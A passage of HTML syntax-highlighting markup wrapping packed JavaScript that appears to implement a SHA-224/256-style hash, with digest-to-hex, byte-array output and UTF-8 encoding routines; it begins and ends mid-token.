class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">28&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">]}&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201e&lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="nx">N&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Q&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">U&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">N&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Q&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">N&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Q&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">G&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">(){&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20C&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202b&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202b&lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="nx">N&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Q&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">27&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">N&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Q&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">G&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">N&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Q&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">R&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">(){&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201w&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">O&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20Z&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="mi">28&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="mi">32&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">O&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x204x&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">28&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201w&lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201P&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">G&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20i&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">T&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20G&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">T&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x272p&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20L&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[],&lt;/span>&lt;span class="nx">W&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">G&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">W&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">M&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nx">W&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">G&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">Q&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nx">R&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">L&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">M&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">L&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">M&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">t&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="nx">L&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">M&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">R&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">V&lt;/span>&lt;span class="p">))}&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;gt;=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">L&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">M&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="nx">L&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">M&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">R&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">V&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="nx">L&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">M&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">R&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">V&lt;/span>&lt;span class="p">))}&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(((&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mi">23&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">G&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">Q&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mi">23&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="nx">L&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">M&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">X&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">18&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="nx">L&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">M&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">R&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">V&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="nx">L&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">M&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">R&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span 